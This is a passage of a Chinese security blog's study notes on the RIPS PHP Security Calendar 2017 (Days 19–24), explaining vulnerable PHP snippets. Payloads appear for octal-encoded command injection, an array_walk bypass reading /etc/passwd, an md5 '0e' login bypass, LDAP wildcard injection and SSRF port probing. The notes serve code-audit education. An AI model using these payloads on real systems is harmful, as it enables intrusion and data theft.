+<p>stripcslashes — 反引用一个使用 <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/function.addcslashes.html">addcslashes()</a> 转义的字符串</p>
+<p><strong>说明</strong></p>
+<p>string stripcslashes ( string <code>$str</code> )</p>
+<p>返回反转义后的字符串。可识别类似 C 语言的 <em>\n</em>，<em>\r</em>，… 八进制以及十六进制的描述。</p>
+</blockquote>
+<p>PS:还有一个类似的函数<code>stripslashes</code></p>
+<blockquote>
+<p>反引用一个引用字符串。</p>
+</blockquote>
+<p>差别在于<code>stripcslashes</code>会转义C语言以及十进制和8进制。例如：</p>
+<pre><code class="php">php &gt; var_dump(stripcslashes(&#39;\x30\x3b\x73\x6c\x65\x65\x70\x20\x35\x3b&#39;));
+string(10) &quot;0;sleep 5;&quot;    //十六进制
+php &gt; var_dump(stripcslashes(&#39;0\073\163\154\145\145\160\0405\073&#39;));
+string(10) &quot;0;sleep 5;&quot;    //八进制</code></pre>
+<p>正则<code>/[^0-9\\\]/</code>限制了只能使用数字和<code>\</code>，所以可以使用八进制配合``stripcslashes<code>拼接</code>/usr/bin/convert {$this-&gt;file} –resize $e`执行命令，造成命令注入漏洞。</p>
+<p>eg：传入：<code>size=0\073\163\154\145\145\160\0405\073</code></p>
+<pre><code>/usr/bin/convert images/image.png --resize 0;sleep 5; ./thumbs/image.png</code></pre>
+<h2 id="Day-20-Stocking"><a href="#Day-20-Stocking" class="headerlink" title="Day 20 - Stocking"></a>Day 20 - Stocking</h2><p><strong>code:</strong></p>
+<pre><code class="php">set_error_handler(function ($no, $str, $file, $line) &#123;
+    throw new ErrorException($str, 0, $no, $file, $line);
+&#125;, E_ALL);
+
+class ImageLoader
+&#123;
+    public function getResult($uri)
+    &#123;
+        if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;
+            return &#39;&lt;p&gt;Please enter valid uri&lt;/p&gt;&#39;;
+        &#125;
+
+        try &#123;
+            $image = file_get_contents($uri);
+            $path = &quot;./images/&quot; . uniqid() . &#39;.jpg&#39;;
+            file_put_contents($path, $image);
+            if (mime_content_type($path) !== &#39;image/jpeg&#39;) &#123;
+                unlink($path);
+                return &#39;&lt;p&gt;Only .jpg files allowed&lt;/p&gt;&#39;;
+            &#125;
+        &#125; catch (Exception $e) &#123;
+            return &#39;&lt;p&gt;There was an error: &#39; .
+                $e-&gt;getMessage() . &#39;&lt;/p&gt;&#39;;
+        &#125;
+
+        return &#39;&lt;img src=&quot;&#39; . $path . &#39;&quot; width=&quot;100&quot;/&gt;&#39;;
+    &#125;
+&#125;
+
+echo (new ImageLoader())-&gt;getResult($_GET[&#39;img&#39;]);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>问题在于提供了错误显示，并且将错误输出了出来。可以利用错误信息的输出进行信息探测。</p>
+<blockquote>
+<p><code>set_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL);</code></p>
+<p>这个就类似于设置如下的代码：</p>
+<p><code>error_reporting(E_ALL);ini_set(&#39;display_errors&#39;, TRUE);ini_set(&#39;display_startup_errors&#39;, TRUE);</code></p>
+<p>如此就会包含所有的错误信息。加上<code>&#39;There was an error: &#39; .$e-&gt;getMessage() . &#39;&#39;</code>就导致会在页面上显示所有的信息，包括warning信息。</p>
+</blockquote>
+<p>正常情况下，如果使用<code>file_get_contents(&#39;http://127.0.0.1:80&#39;)</code>显示的仅仅只是<code>warning信息</code>，在正常的PHP页面中是不会显示warning信息的。但是在开启了上述的配置之后，所有的信息都会在页面上显示。这样就导致我们可以通过SSRF来探测内网的端口和服务了。</p>
+<h2 id="Day-21-Gift-Wrap"><a href="#Day-21-Gift-Wrap" class="headerlink" title="Day 21 - Gift Wrap"></a>Day 21 - Gift Wrap</h2><p><strong>code:</strong></p>
+<pre><code class="php">declare(strict_types=1);
+
+class ParamExtractor &#123;
+    private $validIndices = [];
+
+    private function indices($input) &#123;
+        $validate = function (int $value, $key) &#123;
+            if ($value &gt; 0) &#123;
+                $this-&gt;validIndices[] = $key;
+            &#125;
+        &#125;;
+
+        try &#123;
+            array_walk($input, $validate, 0);
+        &#125; catch (TypeError $error) &#123;
+            echo &quot;Only numbers are allowed as input&quot;;
+        &#125;
+
+        return $this-&gt;validIndices;
+    &#125;
+
+    public function getCommand($parameters) &#123;
+        $indices = $this-&gt;indices($parameters);
+        $params = [];
+        foreach ($indices as $index) &#123;
+            $params[] = $parameters[$index];
+        &#125;
+        return implode($params, &#39; &#39;);
+    &#125;
+&#125;
+
+$cmd = (new ParamExtractor())-&gt;getCommand($_GET[&#39;p&#39;]);
+system(&#39;resizeImg image.png &#39; . $cmd);</code></pre>
+<blockquote>
+<p>declare(strict_type=1);是<strong>php7</strong>引入的<code>严格类型检查模式</code>的指定语法.</p>
+<p>在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用</p>
+</blockquote>
+<p>按说在声明了严格类型检查的模式下经过<code>validate()</code>函数检查的参数值都是大于0的int型。但是导致问题的是调用方式，<strong>通过<code>array_walk()</code>调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数</strong>。</p>
+<p>e g:</p>
+<pre><code class="php">declare(strict_types=1);
+function addnum(int &amp;$value) &#123;
+    $value = $value+1;
+&#125;
+$input = array(&#39;3a&#39;,&#39;4b&#39;);
+var_dump($input);
+array_walk($input,addnum);
+var_dump($input);</code></pre>
+<p>输出：</p>
+<pre><code class="php">array(2) &#123;
+  [0]=&gt;
+  string(2) &quot;3a&quot;
+  [1]=&gt;
+  string(2) &quot;4b&quot;
+&#125;
+
+array(2) &#123;
+  [0]=&gt;
+  int(4)
+  [1]=&gt;
+  int(5)
+&#125;</code></pre>
+<p>由于<code>array_walk()</code>的这种特性，我们可以传入任意字符进去，造成了命令执行。</p>
+<p>payload：<code>?p[1]=1&amp;p[2]=2;%20cat%20/etc/passwd</code></p>
+<h2 id="Day-22-Chimney"><a href="#Day-22-Chimney" class="headerlink" title="Day 22 - Chimney"></a>Day 22 - Chimney</h2><p><strong>code:</strong></p>
+<pre><code class="php">if (isset($_POST[&#39;password&#39;])) &#123;
+    setcookie(&#39;hash&#39;, md5($_POST[&#39;password&#39;]));
+    header(&quot;Refresh: 0&quot;);
+    exit;
+&#125;
+
+$password = &#39;0e836584205638841937695747769655&#39;;
+if (!isset($_COOKIE[&#39;hash&#39;])) &#123;
+    echo &#39;&lt;form&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&#39;
+       . &#39;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt;&lt;/form &gt;&#39;;
+    exit;
+&#125; elseif (md5($_COOKIE[&#39;hash&#39;]) == $password) &#123;
+    echo &#39;Login succeeded&#39;;
+&#125; else &#123;
+    echo &#39;Login failed&#39;;
+&#125;</code></pre>
+<p><strong>漏洞：</strong></p>
+<p><code>md5($_COOKIE[&#39;hash&#39;]) == $password</code>使用的是<code>==</code>且<code>$password</code>为0e开头，比较时会当成科学计数法，所以找到一个hash为同样<code>0e数字</code>格式的就行。</p>
+<pre><code class="php">php &gt; echo md5(&#39;240610708&#39;);
+0e462097431906509019562988736854</code></pre>
+<p>Payload:</p>
+<pre><code>Cookie:hash=240610708</code></pre>
+<h2 id="Day-23-Cookies"><a href="#Day-23-Cookies" class="headerlink" title="Day 23 - Cookies"></a>Day 23 - Cookies</h2><p><strong>code:</strong></p>
+<pre><code class="php">class LDAPAuthenticator &#123;
+    public $conn;
+    public $host;
+
+    function __construct($host = &quot;localhost&quot;) &#123;
+        $this-&gt;host = $host;
+    &#125;
+
+    function authenticate($user, $pass) &#123;
+        $result = [];
+        $this-&gt;conn = ldap_connect($this-&gt;host);    
+        ldap_set_option(
+            $this-&gt;conn,
+            LDAP_OPT_PROTOCOL_VERSION,
+            3
+        );
+        if (!@ldap_bind($this-&gt;conn))
+            return -1;
+        $user = ldap_escape($user, null, LDAP_ESCAPE_DN);
+        $pass = ldap_escape($pass, null, LDAP_ESCAPE_DN);
+        $result = ldap_search(
+            $this-&gt;conn,
+            &quot;&quot;,
+            &quot;(&amp;(uid=$user)(userPassword=$pass))&quot;
+        );
+        $result = ldap_get_entries($this-&gt;conn, $result);
+        return ($result[&quot;count&quot;] &gt; 0 ? 1 : 0);
+    &#125;
+&#125;
+
+if(isset($_GET[&quot;u&quot;]) &amp;&amp; isset($_GET[&quot;p&quot;])) &#123;
+    $ldap = new LDAPAuthenticator();
+    if ($ldap-&gt;authenticate($_GET[&quot;u&quot;], $_GET[&quot;p&quot;])) &#123;
+        echo &quot;You are now logged in!&quot;;
+    &#125; else &#123;
+        echo &quot;Username or password unknown!&quot;;
+    &#125;
+&#125;</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>题目中使用的过滤函数是<code>ldap_escape($user, null, LDAP_ESCAPE_DN)</code>。</p>
+<blockquote>
+<p><strong>ldap_escape</strong></p>
+<p>dap_escape — Escape a string for use in an LDAP filter or DN</p>
+<p>string ldap_escape ( string <code>$value</code> [, string <code>$ignore</code> [, int <code>$flags</code> ]] )</p>
+<p>Escapes <code>value</code> for use in the context implied by <code>flags</code>.</p>
+<p><code>flags</code></p>
+<p>The context the escaped string will be used in: <strong><code>LDAP_ESCAPE_FILTER</code></strong> for filters to be used with <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/function.ldap-search.html">ldap_search()</a>, or**<code>LDAP_ESCAPE_DN</code>** for DNs.</p>
+</blockquote>
+<p>当使用ldap_search()时需要选择LDAP_ESCAPE_FILTER过滤字符串，但是如果选择LDAP_ESCAPE_DN将会导致过滤无效。</p>
+<p>payload：<code>u=*&amp;p=123456</code></p>
+<h2 id="Day-24-Nutcracker"><a href="#Day-24-Nutcracker" class="headerlink" title="Day 24 - Nutcracker"></a>Day 24 - Nutcracker</h2><p><strong>code:</strong></p>
+<pre><code class="php">@$GLOBALS=$GLOBALS&#123;next&#125;=next($GLOBALS&#123;&#39;GLOBALS&#39;&#125;)
+[$GLOBALS[&#39;next&#39;][&#39;next&#39;]=next($GLOBALS)[&#39;GLOBALS&#39;]]
+[$next[&#39;GLOBALS&#39;]=next($GLOBALS[GLOBALS][&#39;GLOBALS&#39;])
+[$next[&#39;next&#39;]]][$next[&#39;GLOBALS&#39;]=next($next[&#39;GLOBALS&#39;])]
+[$GLOBALS[next][&#39;next&#39;]($GLOBALS[&#39;next&#39;]&#123;&#39;GLOBALS&#39;&#125;)]=
+next(neXt($&#123;&#39;next&#39;&#125;[&#39;next&#39;]));</code></pre>
+<p>一道CTF题</p>
+<blockquote>
+<p><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor</a></p>
+</blockquote>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2020/02/19/rips-php-security-calendar-2017-xue-xi-ji-lu/">https://lanvnal.com/2020/02/19/rips-php-security-calendar-2017-xue-xi-ji-lu/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/">
+                    <div class="card-image">
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/typecho.jpg" class="responsive-img" alt="Typecho反序列化漏洞分析">
+                        
+                        <span class="card-title">Typecho反序列化漏洞分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-15
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/16/hexo-ban-ben-sheng-ji/">
+                    <div class="card-image">
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/hexo.png" class="responsive-img" alt="Hexo版本升级指南">
+                        
+                        <span class="card-title">Hexo版本升级指南</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/other/" class="post-category">
+                                    other
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Hexo/">
+                        <span class="chip bg-color">Hexo</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
